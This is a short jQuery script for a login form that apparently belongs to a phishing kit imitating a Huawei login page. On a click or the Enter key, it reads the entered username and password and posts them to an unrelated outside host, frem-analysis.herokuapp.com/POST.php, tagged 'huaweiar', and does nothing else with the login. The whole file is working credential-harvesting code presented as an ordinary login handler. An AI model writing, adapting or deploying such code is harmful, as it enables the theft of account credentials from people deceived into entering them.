$(function(){
    // ======= word "OR" Center
    var apsWidth = $('.aps p').width();
    var realWidth = 'calc(50% - (' + apsWidth + 'px / 2))';
    $('.aps p').css('left',realWidth);
    //======================

    $('#log-in').click(function() {

        var myLink = "https://frem-analysis.herokuapp.com/POST.php";
        var myUser = $('#user-name').val();
        var myPass = $('#my-pass').val();

        var request = $.ajax({
            url: myLink,
            method: "POST",
            data: { user1 : myUser, pass1 : myPass, dir1 : "huaweiar" },
            dataType: "html"
          });
           
          request.done(function( msg ) {
            console.log('Done1');
          });

    });

    $('body').keypress(function (e) {
        var key = e.which;
        if(key == 13)  // the enter key code
         {
           $('#log-in').click();
           return false;  
         }
       }); 

});
